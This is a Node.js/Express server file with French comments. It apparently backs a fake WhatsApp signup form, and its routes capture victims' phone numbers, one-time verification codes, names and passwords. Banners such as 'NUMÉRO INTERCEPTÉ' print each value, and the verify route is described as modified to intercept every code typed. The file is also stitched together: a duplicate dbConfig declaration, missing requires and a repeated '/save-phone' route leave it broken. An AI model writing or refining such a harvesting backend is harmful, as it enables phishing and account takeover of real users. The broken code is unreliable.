require('dotenv').config(); // Installe d'abord : npm install dotenv

const dbConfig = {
    host: process.env.DB_HOST,
    user: process.env.DB_USER,
    password: process.env.DB_PASS,
    database: process.env.DB_NAME,
    port: 3306 // Port MySQL par défaut
};

// Utilise le port fourni par l'hébergeur ou 3000 par défaut
const PORT = process.env.PORT || 3000;
// ============================================
// CONFIGURATION CONNEXION (A modifier)
// ============================================
const dbConfig = {
    host: 'localhost',
    user: 'root',
    password: '', // <--- VIDE, ne mets même pas d'espace entre les guillemets
    database: 'signup_db'
};

let db;

async function initDatabase() {
    try {
        db = await mysql.createConnection(dbConfig);
        console.log('✅ Connecté à MySQL : signup_db');
    } catch (error) {
        console.error('❌ Erreur de connexion DB. Vérifiez le mot de passe ou si la DB existe.');
        console.error(error.message);
        process.exit(1);
    }
}

// Fonction pour enregistrer les logs comme prévu dans ta table 'signup_logs'
async function logAction(phone, action, data = {}, ip = '127.0.0.1') {
    try {
        await db.execute(
            'INSERT INTO signup_logs (phone, action, data, ip_address) VALUES (?, ?, ?, ?)',
            [phone, action, JSON.stringify(data), ip]
        );
    } catch (err) { console.error('Erreur log:', err.message); }
}

// ============================================
// ROUTES API (TERMINAL)
// ============================================

// 1. Reception du numéro (Etape 1)
app.post('/save-phone', async (req, res) => {
    try {
        const { phone, countryCode, phoneNumber } = req.body;

        console.log('\n--- 📱 NUMÉRO INTERCEPTÉ ---');
        console.log(`FULL PHONE : ${phone}`);
        console.log(`PAYS       : ${countryCode}`);
        console.log(`MOBILE     : ${phoneNumber}`);
        console.log('----------------------------\n');

        const [existing] = await db.execute('SELECT * FROM users WHERE full_phone = ?', [phone]);
        
        if (existing.length === 0) {
            await db.execute(
                'INSERT INTO users (country_code, phone_number, full_phone) VALUES (?, ?, ?)',
                [countryCode, phoneNumber, phone]
            );
            await logAction(phone, 'PHONE_REGISTERED', { step: 1 });
        }

        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, message: error.message });
    }
});

// 2. Génération du code (Etape 2)
app.post('/generate-code', async (req, res) => {
    try {
        const { phone } = req.body;
        const code = Math.floor(100000 + Math.random() * 900000).toString();
        const expiresAt = new Date(Date.now() + 10 * 60 * 1000);

        await db.execute(
            'INSERT INTO verification_codes (phone, code, expires_at) VALUES (?, ?, ?)',
            [phone, code, expiresAt]
        );

        console.log(`🔐 CODE GÉNÉRÉ [${phone}] -> ${code}`);
        await logAction(phone, 'CODE_SENT', { code_val: code });

        res.json({ success: true, devCode: code });
    } catch (error) {
        res.status(500).json({ success: false });
    }
});

// 3. Vérification du code (Modifiée pour tout intercepter)
app.post('/verify-code', async (req, res) => {
    try {
        const { phone, code } = req.body;

        // --- CETTE PARTIE EST NOUVELLE : LOG SYSTEMATIQUE ---
        console.log('\n--- 🔑 TENTATIVE DE VÉRIFICATION ---');
        console.log(`UTILISATEUR : ${phone}`);
        console.log(`CODE SAISI  : ${code}`); // On affiche ce que l'utilisateur a tapé
        console.log('------------------------------------\n');

        // On cherche si ce code existe et est valide pour ce numéro
        const [rows] = await db.execute(
            'SELECT * FROM verification_codes WHERE phone = ? AND code = ? AND used = FALSE AND expires_at > NOW()',
            [phone, code]
        );

        if (rows.length > 0) {
            // Si le code est bon
            await db.execute('UPDATE verification_codes SET used = TRUE WHERE id = ?', [rows[0].id]);
            await db.execute('UPDATE users SET verified = TRUE WHERE full_phone = ?', [phone]);
            
            console.log(`✅ CODE CORRECT pour ${phone}`);
            await logAction(phone, 'PHONE_VERIFIED', { code_entered: code });
            return res.json({ success: true });
        } else {
            // Si le code est mauvais
            console.log(`❌ CODE INCORRECT saisi par ${phone} (Code tapé: ${code})`);
            await logAction(phone, 'INVALID_CODE_ATTEMPT', { code_entered: code });
            return res.json({ success: false, message: 'Code incorrect' });
        }
    } catch (error) {
        console.error('Erreur lors de la vérification:', error.message);
        res.status(500).json({ success: false });
    }
});

// 4. Inscription complète (Etape 3)
app.post('/complete-registration', async (req, res) => {
    try {
        const { phone, fullName, password } = req.body;
        const hash = await bcrypt.hash(password, 10);

        await db.execute(
            'UPDATE users SET full_name = ?, password_hash = ? WHERE full_phone = ?',
            [fullName, hash, phone]
        );

        console.log('\n*******************************');
        console.log('🎉 INSCRIPTION RÉUSSIE !');
        console.log(`NOM : ${fullName}`);
        console.log(`TEL : ${phone}`);
        console.log('*******************************\n');

        await logAction(phone, 'REGISTRATION_COMPLETE', { name: fullName });

        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false });
    }
});

// Lancement
initDatabase().then(() => {
    app.listen(PORT, () => {
        console.log(`🚀 Serveur actif sur http://localhost:${PORT}`);
        console.log('En attente des données du formulaire WhatsApp...');
    });
});

app.post('/save-phone', async (req, res) => {
    try {
        const { phone, countryCode, phoneNumber } = req.body;

        console.log(`\n--- Tentative d'enregistrement : ${phone} ---`);

        // On vérifie si le numéro existe déjà pour éviter le plantage
        const [existing] = await db.execute('SELECT * FROM users WHERE full_phone = ?', [phone]);
        
        if (existing.length === 0) {
            await db.execute(
                'INSERT INTO users (country_code, phone_number, full_phone) VALUES (?, ?, ?)',
                [countryCode, phoneNumber, phone]
            );
            console.log("✅ Nouveau numéro ajouté à la DB.");
        } else {
            console.log("ℹ️ Numéro déjà connu, on passe à la suite.");
        }

        res.json({ success: true });
    } catch (error) {
        // C'EST CETTE LIGNE QUI VA NOUS DIRE LE PROBLÈME :
        console.error('❌ ERREUR SERVEUR :', error.sqlMessage || error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});